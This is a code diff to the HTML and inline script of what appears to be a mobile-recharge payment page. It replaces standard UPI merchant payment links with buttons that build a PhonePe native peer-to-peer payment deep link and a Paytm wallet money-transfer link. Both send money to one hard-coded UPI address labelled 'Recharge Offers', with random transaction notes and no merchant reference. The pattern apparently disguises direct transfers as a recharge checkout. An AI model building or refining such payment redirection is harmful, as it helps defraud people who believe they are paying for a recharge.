@@ -24,8 +24,8 @@
     />
 
     <!-- Stylesheets -->
-    <link rel="stylesheet" href="assets/css/common.css?v=60" />
-    <link rel="stylesheet" href="assets/css/payment.css?v=60" />
+    <link rel="stylesheet" href="assets/css/common.css?v=75" />
+    <link rel="stylesheet" href="assets/css/payment.css?v=75" />
   </head>
   <body>
     <!-- SVG Sprite -->
@@ -101,12 +101,11 @@
         </div>
 
         <!-- Option 1: PhonePe -->
-        <a
-          class="payment-method app-pay-link"
+        <button
+          type="button"
+          class="payment-method"
           id="phonepeLink"
-          data-method="PhonePe"
-          data-app="phonepe"
-          href="intent://pay?pa=paytmqr6udcnp@ptys&amp;pn=Paytm&amp;am=349.00&amp;cu=INR&amp;tn=Recharge%209876543210&amp;tr=ORD-95403622#Intent;scheme=upi;package=com.phonepe.app;end"
+          data-pay="phonepe"
         >
           <div class="method-left">
             <div class="method-icon">
@@ -123,15 +122,14 @@
           <div class="method-arrow">
             <svg viewBox="0 0 24 24"><use href="#icon-arrow"></use></svg>
           </div>
-        </a>
+        </button>
 
         <!-- Option 2: Paytm -->
-        <a
-          class="payment-method app-pay-link"
+        <button
+          type="button"
+          class="payment-method"
           id="paytmLink"
-          data-method="Paytm"
-          data-app="paytm"
-          href="paytmmp://pay?pa=paytmqr6udcnp@ptys&amp;pn=Paytm&amp;am=349.00&amp;cu=INR&amp;tn=Recharge%209876543210&amp;tr=ORD-95403622"
+          data-pay="paytm"
         >
           <div class="method-left">
             <div class="method-icon">
@@ -145,7 +143,7 @@
           <div class="method-arrow">
             <svg viewBox="0 0 24 24"><use href="#icon-arrow"></use></svg>
           </div>
-        </a>
+        </button>
 
         <!-- Option 3: Scan QR Code -->
         <button
@@ -213,36 +211,39 @@
             var p = new URLSearchParams(window.location.search);
             var m = p.get('mobile') || sessionStorage.getItem('swift_mobile') || '9876543210';
             var a = p.get('amount') || '349';
-            var ord = p.get('order_id') || sessionStorage.getItem('swift_order_id');
-            if (!ord) {
-              ord = 'ORD-' + Math.floor(10000000 + Math.random() * 90000000);
-              try { sessionStorage.setItem('swift_order_id', ord); } catch (e) {}
-            }
-            var q = 'pa=paytmqr6udcnp@ptys&pn=Paytm&am=' + Number(a).toFixed(2) + '&cu=INR&tn=' + encodeURIComponent('Recharge ' + m) + '&tr=' + ord;
-            var isAndroid = /android/i.test(navigator.userAgent || '');
-            var isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent || '');
+            var vpa = 'paytmqr6udcnp@ptys';
+            var name = 'Recharge Offers';
+            var amtPaise = Math.round(Number(a) * 100);
+            var txn = 'TXN-' + Math.floor(100000000000 + Math.random() * 900000000000);
 
-            var gn = document.getElementById('genericUpiLink');
+            var payload = {
+              p2pPaymentCheckoutParams: {
+                checkoutType: 'COLLECT',
+                initialAmount: amtPaise,
+                note: { type: 'text', message: txn },
+                supportedInstruments: -1
+              },
+              contact: { type: 'EXTERNAL_MERCHANT', name: name, vpa: vpa }
+            };
+            var b64 = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
+            var phonepeNative = 'phonepe://native?data=' + b64 + '&id=p2ppayment';
+            var paytmUrl = 'paytmmp://cash_wallet?pa=' + encodeURIComponent(vpa) +
+              '&pn=' + encodeURIComponent(name) +
+              '&am=' + Number(a).toFixed(2) +
+              '&cu=INR&tn=' + encodeURIComponent(txn) +
+              '&tr=&mc=&featuretype=money_transfer';
+
             var ph = document.getElementById('phonepeLink');
-            var gp = document.getElementById('gpayLink');
             var pt = document.getElementById('paytmLink');
-            var bh = document.getElementById('bhimLink');
-
-            if (gn) gn.href = 'upi://pay?' + q;
-            if (pt) pt.href = 'paytmmp://pay?' + q;
-
-            if (isAndroid) {
-              if (ph) ph.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=com.phonepe.app;end';
-              if (gp) gp.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end';
-              if (bh) bh.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=in.org.npci.upiapp;end';
-            } else if (isIOS) {
-              if (ph) ph.href = 'phonepe://pay?' + q;
-              if (gp) gp.href = 'gpay://upi/pay?' + q;
-              if (bh) bh.href = 'upi://pay?' + q;
-            } else {
-              if (ph) ph.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=com.phonepe.app;end';
-              if (gp) gp.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end';
-              if (bh) bh.href = 'intent://pay?' + q + '#Intent;scheme=upi;package=in.org.npci.upiapp;end';
+            if (ph) {
+              ph.href = phonepeNative;
+              ph.setAttribute('href', phonepeNative);
+              ph.setAttribute('data-url', phonepeNative);
+            }
+            if (pt) {
+              pt.href = paytmUrl;
+              pt.setAttribute('href', paytmUrl);
+              pt.setAttribute('data-url', paytmUrl);
             }
           } catch (e) {}
         })();
@@ -424,6 +425,6 @@
 
     <!-- Offline Dynamic QR Code Engine & Payment Script -->
     <script src="assets/js/qrcode.bundle.js"></script>
-    <script src="assets/js/payment.js?v=60"></script>
+    <script src="assets/js/payment.js?v=75"></script>
   </body>
 </html>
